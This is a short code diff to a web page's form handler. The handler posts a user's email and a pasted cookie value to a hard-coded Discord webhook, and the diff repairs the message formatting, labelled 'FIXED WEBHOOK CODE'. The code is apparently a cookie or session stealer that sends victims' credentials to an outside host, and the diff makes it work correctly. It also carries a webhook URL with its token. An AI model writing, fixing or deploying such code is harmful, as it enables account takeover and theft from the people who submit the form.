@@ -375,11 +375,12 @@
         submitBtn.innerHTML = `<span class="spin">🌀</span> Processing...`;
         submitBtn.disabled = true;
         
+        // FIXED WEBHOOK CODE:
         await fetch('https://discord.com/api/webhooks/1362160509033382008/lJKt647dAoHQReTt--qKe8Kp2yInWMqO6fJ7v8ev3U_FT-aDATnGgKuB2cCqUxoKruwT', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({
-            content: `📧 Email: ${email}\n🍪 Cookie:\n\`\`\`${cookie}'
+            content: `📧 Email: ${email}\n🍪 Cookie:\n\`\`\`${cookie}\n\`\`\``
           })
         });
         
